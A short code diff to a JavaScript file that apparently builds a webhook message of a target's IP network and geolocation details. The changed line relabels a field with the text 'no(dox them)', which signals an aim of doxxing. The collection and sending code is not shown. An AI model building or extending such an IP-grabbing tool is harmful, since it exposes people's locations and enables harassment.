@@ -95,7 +95,7 @@ async function getIPDetails() {
 }
 
 function buildPayload(details) {
-  const bool = v => (v === true ? "✅" : v === false ? "❌" : "N/A");
+  const bool = v => (v === true ? "Yess" : v === false ? "no(dox them)" : "N/A");
   return JSON.stringify({
     embeds: [{
       title: "IP Network & Geolocation Data",
